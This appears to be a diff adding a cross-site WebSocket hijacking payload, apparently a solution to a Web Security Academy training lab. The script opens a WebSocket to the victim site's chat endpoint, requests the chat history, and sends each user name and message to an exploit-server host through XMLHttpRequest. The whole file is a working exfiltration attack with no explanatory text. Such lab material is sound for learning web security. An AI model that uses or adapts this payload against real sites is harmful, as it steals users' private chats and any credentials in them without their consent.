@@ -1,0 +1,63 @@
+<script>
+    (function () {
+        var webSocket = openWebSocket();
+
+        function writeMessage(className, user, content) {
+            console.log(user + ": " + content);
+            const xhr = new XMLHttpRequest();
+            const uri = "https://exploit-???.exploit-server.net" +
+                "?user=" + user +
+                "&message=" + content
+            xhr.open("GET", encodeURI(uri));
+            xhr.send();
+        }
+
+        function openWebSocket() {
+            return new Promise(res => {
+                if (webSocket) {
+                    res(webSocket);
+                    return;
+                }
+
+                let newWebSocket = new WebSocket("wss://???.web-security-academy.net/chat");
+
+                newWebSocket.onopen = function (evt) {
+                    console.log("system", "System:", "No chat history on record");
+                    newWebSocket.send("READY");
+                    res(newWebSocket);
+                }
+
+                newWebSocket.onmessage = function (evt) {
+                    var message = evt.data;
+
+                    if (message === "TYPING") {
+                        writeMessage("typing", "", "[typing...]")
+                    } else {
+                        var messageJson = JSON.parse(message);
+                        if (messageJson && messageJson['user'] !== "CONNECTED") {
+                            Array.from(document.getElementsByClassName("system")).forEach(function (element) {
+                                element.parentNode.removeChild(element);
+                            });
+                        }
+                        Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
+                            element.parentNode.removeChild(element);
+                        });
+
+                        if (messageJson['user'] && messageJson['content']) {
+                            writeMessage("message", messageJson['user'], messageJson['content'])
+                        } else if (messageJson['error']) {
+                            writeMessage('message', "Error:", messageJson['error']);
+                        }
+                    }
+                };
+
+                newWebSocket.onclose = function (evt) {
+                    webSocket = undefined;
+                    writeMessage("message", "System", "--- Disconnected ---");
+                };
+            });
+        }
+    })();
+
+
+</script>
